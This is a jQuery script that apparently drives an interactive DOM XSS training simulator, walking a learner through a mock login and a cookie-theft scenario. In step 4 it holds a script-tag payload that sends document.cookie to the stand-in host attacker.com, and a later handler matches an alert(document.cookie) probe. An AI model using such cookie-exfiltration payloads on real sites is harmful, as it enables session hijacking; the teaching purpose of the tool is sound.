$(document).ready(function(){
    // Get_Started
    handle_get_started("kindofXSS");
    function handle_get_started(kindofAttack){
        $(document).on("click","#XSS",function(){
            $(".mainmenu").hide(1000);
            $(".submenu .back").removeAttr("style");
            $(".submenu ."+kindofAttack).removeAttr("style");
        });
        $(document).on("click",".submenu .back",function(){
            $(".submenu .back").attr({style:"display:none;"});
            $(".submenu ."+kindofAttack).attr({style:"display:none;"});
            $(".mainmenu").fadeIn(1000);

        });
    };
    // scroll bar
    function scrollbar(){
        $('.DOM_XSS .action .tutorial').animate({
            scrollTop: $('.DOM_XSS .action .tutorial').get(0).scrollHeight
        }, 1500);
    }
    // DOM_XSS

    //instruction
    $(".DOM_XSS .instruction #inst").hide(3000); 
    $(".DOM_XSS .instruction #inst1").fadeIn(2500).hide(2500);
    $(".DOM_XSS .instruction #inst1_1").fadeIn(2500);  
    //action
        //step 1
            //show step 1
                // back id="backinst"
                // next id=""
                    $(document).on("click",".DOM_XSS .instruction #inst1_1 .next",function(){
                        $(".DOM_XSS .instruction #inst1_1").hide(2500)
                        $(".DOM_XSS .action").fadeIn(2500);
                        $(".action .next").attr("disabled","").attr("title","Disabled"); // not next event
                        $(".DOM_XSS .action .tutorial").fadeIn(2500); //back event  
                        $(".DOM_XSS .action .tutorial .one").fadeIn(2500); 
                        $(".browser .address").attr({value:"social.com/login"});
                        $(".DOM_XSS .action .interactive").fadeIn(2500); //back event  
                        $(".DOM_XSS .action .interactive .one").fadeIn(2500);   
                        $(".action .next").fadeIn(); //back event 
                        $(".action .back").fadeIn(); //back event 
                        $(".action .back").attr("id","backinst"); //back event 
                        scrollbar();
                    });  
            //back to step inst
                // back id="backinst"
                // next id=""
                    $(document).on("click",".action #backinst",function(){
                        $(".action .next").hide();
                        $(".action .back").hide();
                        $(".DOM_XSS .action .tutorial").hide(); 
                        $(".DOM_XSS .action .interactive").hide();  
                        $(".DOM_XSS .instruction #inst1").fadeIn(2500).hide(2500);
                        $(".DOM_XSS .instruction #inst1_1").fadeIn(2500);
                        
                    });
        //step 2
            //show step 2
                // back id="backone"
                // next id="nextthree"
                    $(document).on("click",".DOM_XSS .interactive .one #login",function(){
                        var username=$("#username").val();
                        var password=$("#password").val();
                        if(username=="user1" && password=="password"){
                            $(".DOM_XSS .action .tutorial .two").fadeIn(2500); 
                            $(".DOM_XSS .action .interactive .one").hide(2500);
                            $(".DOM_XSS .action .interactive .two").fadeIn(2500); 
                            $(".action .back").removeAttr("id"); //back event 
                            $(".action .back").attr("id","backone"); //back event 
                            $(".action .next").removeAttr("disabled").attr("title","");   
                            $(".action .next").removeAttr("id");
                            $(".action .next").attr("id","nextthree");
                            scrollbar();
                        }
                    });
            //back to step 1
                // back id="backinst"
                // next id=""
                    $(document).on("click",".action #backone",function(){
                        $(".DOM_XSS .action .tutorial .two").hide(2500); 
                        $(".DOM_XSS .action .interactive .two").hide(2500); 
                        $(".DOM_XSS .action .tutorial .one").fadeIn(2500); 
                        $(".DOM_XSS .action .interactive .one").fadeIn(2500); 
                        $(".action .back").removeAttr("id"); //reset back event of step 1
                        $(".action .back").attr("id","backinst"); //reset back event of step 1
                        $(".action .next").removeAttr("id");
                        scrollbar();
                    });
            
            
            

        //step 3
            //show step 3
                // back id="backtwo"
                // next id=""
                    $(document).on("click",".action #nextthree",function(){
                        $(".DOM_XSS .action .interactive .two").hide(2500);
                        $(".DOM_XSS .action .tutorial .three").fadeIn(2500); 
                        $(".browser .address").attr({value:"social.com"});
                        $(".DOM_XSS .action .interactive .three").fadeIn(2500); 
                        $(".action .back").removeAttr("id"); //back event 
                        $(".action .back").attr("id","backtwo"); //back event 
                        $(".action .next").attr("title","disabled");   
                        $(".action .next").removeAttr("id"); //back event 
                        scrollbar();

                    });
            //back to step 2
                // back id="backone"
                // next id="nextthree"
                    $(document).on("click",".action #backtwo",function(){
                        $(".DOM_XSS .action .tutorial .three").hide(2500); 
                        $(".DOM_XSS .action .interactive .three").hide(2500); 
                        $(".DOM_XSS .action .tutorial .two").fadeIn(2500); 
                        $(".DOM_XSS .action .interactive .two").fadeIn(2500); 
                        $(".action .back").removeAttr("id"); //reset back event of step 2
                        $(".action .back").attr("id","backone"); //reset back event of step 2
                        $(".action .next").removeAttr("id"); //reset back event of step 2
                        $(".action .next").attr("id","nextthree"); //reset back event of step 2
                        scrollbar();
                    });
            
        //step 4
            //show step 4
                // back id="backthree"
                // next id="nextfive"
                    $(document).on("keypress",".three .browser .url .address ",function(e){
                        if(e.which === 13){
                            var script=$(this).val().slice(18);
                            if(script=="<script>new image().src=”attacker.com?cookie=”+document.cookie;</script>"){
                                $(".DOM_XSS .action .tutorial .four").fadeIn(2500); 
                                $(".DOM_XSS .action .interactive .three").hide(2500);
                                $(".browser .address").attr({value:"attacker.com?cookie="+Math.random()});
                                $(".DOM_XSS .action .interactive .four").fadeIn(2500); 
                                $(".action .back").removeAttr("id"); //back event 
                                $(".action .back").attr("id","backthree"); //back event 
                                $(".action .next").removeAttr("id");
                                $(".action .next").attr("id","nextfive");
                                scrollbar();
                            }
                        }
                    });
            //back to step 3
                // back id="backtwo"
                // next id=""
                    $(document).on("click",".action #backthree",function(){
                        $(".DOM_XSS .action .tutorial .four").hide(2500); 
                        $(".DOM_XSS .action .interactive .four").hide(2500); 
                        $(".DOM_XSS .action .tutorial .three").fadeIn(2500); 
                        $(".DOM_XSS .action .interactive .three").fadeIn(2500); 
                        $(".action .back").removeAttr("id"); //reset back event of step 3
                        $(".action .back").attr("id","backtwo"); //reset back event of step 3
                        $(".action .next").removeAttr("id");
                    });
            
        //step 5
            //show step 5
                // back id="backfour"
                // next id="nextsix"
                    $(document).on("click",".action #nextfive",function(){
                        $(".DOM_XSS .action .tutorial .five").fadeIn(2500); 
                        $(".action .back").removeAttr("id"); //back event 
                        $(".action .back").attr("id","backfour"); //back event 
                        $(".action .next").removeAttr("id");
                        $(".action .next").attr("id","nextsix");
                        scrollbar();

                    });
            //back to step 4
                // back id="backthree"
                // next id="nextfive"
                    $(document).on("click",".action #backfour",function(){
                        $(".DOM_XSS .action .tutorial .five").hide(2500); 
                        $(".DOM_XSS .action .tutorial .four").fadeIn(2500); 
                        $(".action .back").removeAttr("id"); //reset back event of step 4
                        $(".action .back").attr("id","backthree"); //reset back event of step 4
                        $(".action .next").removeAttr("id");
                        $(".action .next").attr("id","nextfive");
                        scrollbar();
                    });
        //step 6
            //show step 6
                // back id="backfive"
                // next id="nextseven"
                    $(document).on("click",".action #nextsix",function(){
                        $(".DOM_XSS .action .tutorial .six").slideDown(2500); 
                        $(".action .back").removeAttr("id"); //back event 
                        $(".action .back").attr("id","backfive"); //back event 
                        $(".action .next").removeAttr("id");
                        $(".action .next").attr("id","nextseven");
                        scrollbar();

                    });
            //back to step 5
                // back id="backfour"
                // next id="nextsix"
                    $(document).on("click",".action #backfive",function(){
                        $(".DOM_XSS .action .tutorial .six").hide(2500); 
                        $(".DOM_XSS .action .tutorial .five").fadeIn(2500); 
                        $(".action .back").removeAttr("id"); //reset back event of step 5
                        $(".action .back").attr("id","backfour"); //reset back event of step 5
                        $(".action .next").removeAttr("id");
                        $(".action .next").attr("id","nextsix");
                        scrollbar();
                    });
        //step 7 
            //show step 7
                // back id="backsix"
                // next id="switch_vulnerability"
                    $(document).on("click",".action #nextseven",function(){
                        var cookie=$(".browser .address").val().slice(20);
                        $(".browser .frame #cookie").text("Cookie: "+cookie);
                        $(".DOM_XSS .action .tutorial .seven").fadeIn(2500); 
                        $(".DOM_XSS .action .interactive .four").hide(2500);
                        $(".DOM_XSS .action .interactive .seven").fadeIn(2500); 
                        $(".action .back").removeAttr("id"); //back event 
                        $(".action .back").attr("id","backsix"); //back event 
                        $(".action .next").removeAttr("id");
                        $(".action .next").attr("id","switch_vulnerability");
                        scrollbar();
                    });
            //back to step 6
                // back id="backfive"
                // next id="nextseven"
                    $(document).on("click",".action #backsix",function(){
                        $(".DOM_XSS .action .tutorial .seven").hide(2500); 
                        $(".DOM_XSS .action .interactive .seven").hide(2500); 
                        $(".DOM_XSS .action .tutorial .six").fadeIn(2500); 
                        $(".DOM_XSS .action .interactive .six").fadeIn(2500); 
                        $(".action .back").removeAttr("id"); //reset back event of step 6
                        $(".action .back").attr("id","backfive"); //reset back event of step 6
                        $(".action .next").removeAttr("id");
                        $(".action .next").attr("id","nextseven"); //reset back event of step 6
                        scrollbar();
                    });
        //step switch_vulnerability
            //show step switch_vulnerability
                // back id="backsix"
                // next id="switch_vulnerability"
                    $(document).on("click",".action #switch_vulnerability",function(){
                        //$(".DOM_XSS .action .tutorial").hide(); 
                        $(".DOM_XSS .action .tutorial .one").hide(); 
                        $(".DOM_XSS .action .tutorial .two").hide(); 
                        $(".DOM_XSS .action .tutorial .three").hide(); 
                        $(".DOM_XSS .action .tutorial .four").hide(); 
                        $(".DOM_XSS .action .tutorial .five").hide(); 
                        $(".DOM_XSS .action .tutorial .six").hide(); 
                        $(".DOM_XSS .action .tutorial .seven").hide(); 
                        $(".DOM_XSS .action .interactive").hide(); 
                        $(".DOM_XSS .instruction #inst2").fadeIn(2500).hide(2500);
                        // $(".action .next").removeAttr("id");
                        // $(".action .next").attr("id","switch_vulnerability");
                        // $(".action .back").removeAttr("id"); //back event 
                        // $(".action .back").attr("id","backsix"); //back event 
                    });

        

    //vulnerability
    $(document).on("keypress",".frame .domain",function(e){
        if(e.which === 13){
            var search=$(this).val();
            $(".browser .address").attr({value:"social.com?search="+search});
            $(".DOM_XSS .action .tutorial .two").fadeIn(2500);
            if(search=="<script>alert(document.cookie)</script>"){
                search="<script>alert('COOKIE: "+Math.random()+"')</script>";
                $(".DOM_XSS .action .tutorial .three").fadeIn(2500);
            }
            $(this).append(search);
        }
    
    //prevent

    


});
//one page



});